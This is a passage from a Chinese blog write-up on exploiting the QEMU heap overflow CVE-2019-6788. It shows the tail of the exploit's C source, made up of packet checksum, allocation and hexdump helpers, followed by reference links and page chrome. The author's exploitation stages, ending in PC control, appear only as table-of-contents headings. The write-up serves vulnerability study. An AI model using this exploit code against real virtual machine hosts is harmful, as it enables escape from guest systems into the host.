bits)</span></span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">    ptr++;</span><br><span class="line">    chksumlen += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy transport layer protocol to buf (8 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;iphdr.ip_p, <span class="keyword">sizeof</span>(iphdr.ip_p));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(iphdr.ip_p);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(iphdr.ip_p);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP length to buf (16 bits)</span></span><br><span class="line">    svalue = htons(<span class="keyword">sizeof</span>(tcphdr) + payloadlen);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;svalue, <span class="keyword">sizeof</span>(svalue));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(svalue);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(svalue);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP source port to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_sport, <span class="keyword">sizeof</span>(tcphdr.th_sport));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_sport);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_sport);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP destination port to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_dport, <span class="keyword">sizeof</span>(tcphdr.th_dport));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_dport);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_dport);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy sequence number to buf (32 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_seq, <span class="keyword">sizeof</span>(tcphdr.th_seq));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_seq);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_seq);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy acknowledgement number to buf (32 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_ack, <span class="keyword">sizeof</span>(tcphdr.th_ack));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_ack);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_ack);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy data offset to buf (4 bits) and</span></span><br><span class="line">    <span class="comment">// copy reserved bits to buf (4 bits)</span></span><br><span class="line">    cvalue = (tcphdr.th_off &lt;&lt; <span class="number">4</span>) + tcphdr.th_x2;</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;cvalue, <span class="keyword">sizeof</span>(cvalue));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(cvalue);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(cvalue);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP flags to buf (8 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_flags, <span class="keyword">sizeof</span>(tcphdr.th_flags));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_flags);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_flags);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP window size to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_win, <span class="keyword">sizeof</span>(tcphdr.th_win));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_win);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_win);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy TCP checksum to buf (16 bits)</span></span><br><span class="line">    <span class="comment">// Zero, since we don't know it yet</span></span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">    ptr++;</span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">    ptr++;</span><br><span class="line">    chksumlen += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy urgent pointer to buf (16 bits)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, &amp;tcphdr.th_urp, <span class="keyword">sizeof</span>(tcphdr.th_urp));</span><br><span class="line">    ptr += <span class="keyword">sizeof</span>(tcphdr.th_urp);</span><br><span class="line">    chksumlen += <span class="keyword">sizeof</span>(tcphdr.th_urp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy payload to buf</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ptr, payload, payloadlen);</span><br><span class="line">    ptr += payloadlen;</span><br><span class="line">    chksumlen += payloadlen;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Pad to the next 16-bit boundary</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; payloadlen % <span class="number">2</span>; i++, ptr++) &#123;</span><br><span class="line">        *ptr = <span class="number">0</span>;</span><br><span class="line">        ptr++;</span><br><span class="line">        chksumlen++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> checksum((<span class="keyword">uint16_t</span> *)buf, chksumlen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate memory for an array of chars.</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">allocate_strmem</span><span class="params">(<span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"ERROR: Cannot allocate memory because len = %i in "</span></span><br><span class="line">                   <span class="string">"allocate_strmem().\n"</span>,</span><br><span class="line">                   len);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tmp = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(len * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">    <span class="keyword">if</span> (tmp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(tmp, <span class="number">0</span>, len * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">        <span class="keyword">return</span> (tmp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        dbg_printf(</span><br><span class="line">            <span class="string">"ERROR: Cannot allocate memory for array allocate_strmem().\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate memory for an array of unsigned chars.</span></span><br><span class="line"><span class="keyword">uint8_t</span> *allocate_ustrmem(<span class="keyword">int</span> len) &#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> *tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"ERROR: Cannot allocate memory because len = %i in "</span></span><br><span class="line">                   <span class="string">"allocate_ustrmem().\n"</span>,</span><br><span class="line">                   len);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tmp = (<span class="keyword">uint8_t</span> *)<span class="built_in">malloc</span>(len * <span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>));</span><br><span class="line">    <span class="keyword">if</span> (tmp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(tmp, <span class="number">0</span>, len * <span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>));</span><br><span class="line">        <span class="keyword">return</span> (tmp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        dbg_printf(</span><br><span class="line">            <span class="string">"ERROR: Cannot allocate memory for array allocate_ustrmem().\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate memory for an array of ints.</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">allocate_intmem</span><span class="params">(<span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> *tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"ERROR: Cannot allocate memory because len = %i in "</span></span><br><span class="line">                   <span class="string">"allocate_intmem().\n"</span>,</span><br><span class="line">                   len);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tmp = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(len * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="keyword">if</span> (tmp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(tmp, <span class="number">0</span>, len * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        <span class="keyword">return</span> (tmp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        dbg_printf(</span><br><span class="line">            <span class="string">"ERROR: Cannot allocate memory for array allocate_intmem().\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hexdump</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *desc, <span class="keyword">void</span> *addr, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buff[<span class="number">17</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *pc = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Output description if given.</span></span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s:\n"</span>, desc);</span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"  ZERO LENGTH\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"  NEGATIVE LENGTH: %i\n"</span>, len);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Process every byte in the data.</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="comment">// Multiple of 16 means new line (with line offset).</span></span><br><span class="line">        <span class="keyword">if</span> ((i % <span class="number">16</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// Just don't print ASCII for the zeroth line.</span></span><br><span class="line">            <span class="keyword">if</span> (i != <span class="number">0</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"  %s\n"</span>, buff);</span><br><span class="line">            <span class="comment">// Output the offset.</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"  %04x "</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Now the hex code for the specific character.</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" %02x"</span>, pc[i]);</span><br><span class="line">        <span class="comment">// And store a printable ASCII character for later.</span></span><br><span class="line">        <span class="keyword">if</span> ((pc[i] &lt; <span class="number">0x20</span>) || (pc[i] &gt; <span class="number">0x7e</span>))</span><br><span class="line">            buff[i % <span class="number">16</span>] = <span class="string">'.'</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            buff[i % <span class="number">16</span>] = pc[i];</span><br><span class="line">        buff[(i % <span class="number">16</span>) + <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Pad out last line if not exactly 16 characters.</span></span><br><span class="line">    <span class="keyword">while</span> ((i % <span class="number">16</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"   "</span>);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// And print the final ASCII bit.</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"  %s\n"</span>, buff);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://ray-cp.github.io/archivers/qemu-pwn-cve-2019-6788堆溢出漏洞分析" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/qemu-pwn-cve-2019-6788%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</a></p>
<p><a href="https://github.com/0xKira/qemu-vm-escape/blob/master/exp.c" target="_blank" rel="noopener">https://github.com/0xKira/qemu-vm-escape/blob/master/exp.c</a></p>
<p><a href="http://couplee.wang/wnagzihxa1n/SecurityDaily/2020.04.04.html" target="_blank" rel="noopener">http://couplee.wang/wnagzihxa1n/SecurityDaily/2020.04.04.html</a></p>

      
    </div>
    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>打赏还是打残，这是个问题</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>打赏</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/images/weichat.png" alt=" 微信支付">
        <p>微信支付</p>
      </div>
    

    
      <div id="alipay" style="display: inline-block">
        <img id="alipay_qr" src="/images/alipay.jpg" alt=" 支付宝">
        <p>支付宝</p>
      </div>
    

    

  </div>
</div>

      </div>
    

    
      <div>
        <ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者：</strong>
    
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://xiaoxiaorenwu.github.io/2020/05/20/CVE-2019-6788/" title="CVE-2019-6788调试分析">https://xiaoxiaorenwu.github.io/2020/05/20/CVE-2019-6788/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>
    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
  </li>
</ul>

      </div>
    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/CVE分析/" rel="tag"><i class="fa fa-tag"></i> CVE分析</a>
          
            <a href="/tags/Qemu/" rel="tag"><i class="fa fa-tag"></i> Qemu</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/05/15/CVE-2015-7504/" rel="next" title="CVE-2015-7504调试分析">
                <i class="fa fa-chevron-left"></i> CVE-2015-7504调试分析
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/07/20/2020TCTF2020Geekpwn部分题解/" rel="prev" title="2020TCTF/2020Geekpwn部分题解">
                2020TCTF/2020Geekpwn部分题解 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  
    <div class="comments" id="comments">
    </div>
  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/xxrw.jpg" alt="">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description">Babypwner@Dubhe@BUPT</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">58</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">9</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">25</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/xiaoxiaorenwu" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:renwuxiaoxiao@126.com" target="_blank" title="E-mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-mail</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                大佬们的blog~~
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://p4nda.top" title="p4nda" target="_blank">p4nda</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://sunichi.github.io/" title="sunichi" target="_blank">sunichi</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://e3pem.github.io/" title="e3pem" target="_blank">e3pem</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://p1umer.github.io/" title="P1umer" target="_blank">P1umer</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://hpasserby.me/" title="hpasserby" target="_blank">hpasserby</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ama2in9.top/" title="ama2in9" target="_blank">ama2in9</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://t3ls.club/" title="T3LS" target="_blank">T3LS</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.pwn4fun.com/" title="Railgun" target="_blank">Railgun</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2019-6788"><span class="nav-number">1.</span> <span class="nav-text">CVE-2019-6788</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#前置知识"><span class="nav-number">1.1.</span> <span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#搭建环境"><span class="nav-number">1.2.</span> <span class="nav-text">搭建环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#调试与poc"><span class="nav-number">1.3.</span> <span class="nav-text">调试与poc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">1.4.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.5.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Malloc-Primitive"><span class="nav-number">1.5.1.</span> <span class="nav-text">Malloc Primitive</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Arbitary-write"><span class="nav-number">1.5.2.</span> <span class="nav-text">Arbitary write</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Infoleak"><span class="nav-number">1.5.3.</span> <span class="nav-text">Infoleak</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PC-control"><span class="nav-number">1.5.4.</span> <span class="nav-text">PC control</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">1.6.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
            <span id="scrollpercent"><span>0</span>%</span>
          
        </div>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">xiaoxiaorenwu</span>

  
</div>









        
<div class="busuanzi-count">
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
  </script>
  
    <span class="site-uv">
      访客数
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      人
    </span>
  

  
    <span class="site-pv">
      总访问量
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      次
    </span>
  
</div>








        
      </div>
    </footer>

    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  










  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item=>{
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: false,
        notify: false,
        appId: 'wQR3fxNYiFB3Sh2MdPvjK8ez-gzGzoHsz',
        appKey: 'M81KRpr3NUHCSrwBJ9TY73HF',
        placeholder: '欢乐时光就要开始了',
        avatar:'mm',
        guest_info:guest,
        pageSize:'10' || 10,
    });
  </script>



  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
